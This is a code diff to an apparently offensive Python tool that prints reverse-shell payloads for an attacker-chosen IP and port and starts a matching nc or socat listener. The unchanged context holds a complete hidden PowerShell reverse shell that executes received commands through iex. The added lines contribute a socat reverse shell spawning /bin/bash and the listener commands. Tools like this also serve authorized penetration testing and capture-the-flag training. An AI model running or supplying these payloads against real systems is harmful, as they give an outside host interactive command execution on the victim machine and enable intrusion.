@@ -87,6 +87,10 @@ def print_shell(ip,port,choice):
 		print(Fore.WHITE + f'')
 		print(Fore.RED, 'Payload 02 => ', Fore.WHITE + '\n' + f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{ip}",{port})' + ';$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()')
 	
+	elif(choice == '10'):
+		print(Fore.BLUE, '[+] Socat')
+		print(Fore.WHITE + f"socat TCP4:{ip}:{port} EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane")
+		
 	elif(choice == '0'):
 		print(Fore.RED, "[-] See you later")
 		sys.exit(0)
@@ -108,6 +112,7 @@ def main(ip,port):
 	print(Fore.YELLOW +  "[7].JAVA REVERSE SHELL\n")
 	print(Fore.RED +	"[8].XTERM REVERSE SHELL\n")
 	print(Fore.GREEN + "[9].POWERSHELL REVERSE SHELL\n")
+	print(Fore.YELLOW +  "[10].SOCAT\n")
 	print(Fore.YELLOW + "[0].EXIT\n")
 	choice = str(input(Fore.RED + "9 Types of Payloads, Choose Wisely:="))
 	print_shell(ip, port, choice)
@@ -116,6 +121,15 @@ def main(ip,port):
 	if port > 1023:
 		cmd = f'rlwrap nc -lnvp {port}'
 		print('\033[39m')
+		
+	elif (choice == '10') and port > 1023:
+	    cmd = f'rlwrap socat -d TCP4-LISTEN:{port} STDOUT'
+	    print('\033[39m')
+	    
+	elif (choice == '10') and port < 1023:
+	    cmd = f'sudo rlwrap socat -d TCP4-LISTEN:{port} STDOUT'
+	    print(Fore.RED, 'with sudo', '\033[39m')
+	    
 	else:
 		cmd = f'sudo rlwrap nc -lnvp {port}'
 		print(Fore.RED, 'with sudo', '\033[39m')
